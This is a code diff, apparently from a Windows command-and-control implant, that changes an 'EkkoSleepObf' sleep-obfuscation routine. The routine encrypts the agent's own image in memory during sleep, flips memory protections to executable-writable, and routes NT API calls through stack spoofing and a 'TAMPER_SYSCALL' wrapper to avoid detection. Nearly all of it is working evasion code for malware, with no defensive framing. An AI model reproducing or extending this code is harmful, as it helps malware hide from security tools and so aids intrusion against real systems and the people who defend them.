@@ -35,9 +35,9 @@ BOOL EkkoSleepObf(
     PVOID    JmpGadget = { 0 };
     BYTE     JmpPad[] = { 0xFF, 0xE0 };
 
-    ImgBase = TxtBase = agent->ModuleBaseAddr;
-    ImageSize = TxtSize = agent->ImageSize;
-    NumSections = agent->NumSections;
+    ImgBase = TxtBase = agent->PEInfo->ModuleBaseAddr;
+    ImageSize = TxtSize = agent->PEInfo->ImageSize;
+    NumSections = agent->PEInfo->NumSections;
     pProtectData ProtectArr = (pProtectData)agent->apis->pLocalAlloc(LPTR, 25 * sizeof(ProtectData));
 
     GetVirtualProtections(ProtectArr);
@@ -46,8 +46,6 @@ BOOL EkkoSleepObf(
     Protect = PAGE_EXECUTE_READWRITE;
 
     // JmpBypass =  TODO implement jump bypass if we can figure out how it works.
-
-	// TODO implement TxtBase and TxtSize & Protect options for returning the Txt section of memory back to normal after we are done.
 
     /* Create Random Key for payload encryption during sleep cycle. 16 byte key.*/
     for (BYTE i = 0; i < 16; i++)
@@ -61,8 +59,8 @@ BOOL EkkoSleepObf(
     Key.Buffer = Buf;
     Key.Length = Key.MaximumLength = sizeof(Buf);
 
-    Img.Buffer = ImgBase = agent->ModuleBaseAddr;
-	Img.Length = Img.MaximumLength = agent->ImageSize;
+    Img.Buffer = ImgBase = agent->PEInfo->ModuleBaseAddr;
+	Img.Length = Img.MaximumLength = agent->PEInfo->ImageSize;
 
     NtStatus = agent->apis->pRtlCreateTimerQueue(&Queue);
 
@@ -106,8 +104,8 @@ BOOL EkkoSleepObf(
                     Inc++;
 
                     /*Virtual protect*/
-                    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)agent->ModuleBaseAddr;
-                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)agent->ModuleBaseAddr + dosHeader->e_lfanew);
+                    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)agent->PEInfo->ModuleBaseAddr;
+                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)agent->PEInfo->ModuleBaseAddr + dosHeader->e_lfanew);
                     PIMAGE_SECTION_HEADER SectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
 
                     //do protect change for entire binary.
@@ -176,7 +174,7 @@ BOOL EkkoSleepObf(
                     //stack spoofing enabled.
                     /* Wait for the sleep to end*/
 
-                    if(!SpoofStack(agent->apis->pNtSignalAndWaitForSingleObject, 4, EvntStart, EvntDelay, FALSE, NULL)) {
+                    if(!TAMPER_SYSCALL(agent->apis->pNtSignalAndWaitForSingleObject, 4, EvntStart, EvntDelay, FALSE, NULL)) {
                         Success = TRUE;
                     } else {
                         Success = FALSE;
@@ -250,9 +248,10 @@ void GetVirtualProtections(pProtectData ProtectArr) {
     INT index = 0;
     NTSTATUS Success = 0;
 
-    while (TotalLength < agent->ImageSize)
+    while (TotalLength < agent->PEInfo->ImageSize)
     {
-        Success = agent->apis->pNtQueryVirtualMemory(NtCurrentProcess(), (BYTE*)agent->ModuleBaseAddr + TotalLength, MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
+        Success = TAMPER_SYSCALL(agent->apis->pNtQueryVirtualMemory, 6, NtCurrentProcess(), (BYTE*)agent->PEInfo->ModuleBaseAddr + TotalLength, MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
+        //Success = agent->apis->pNtQueryVirtualMemory(NtCurrentProcess(), (BYTE*)agent->PEInfo->ModuleBaseAddr + TotalLength, MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
         if (Success == 0)
         {
             TotalLength += MBI.RegionSize;
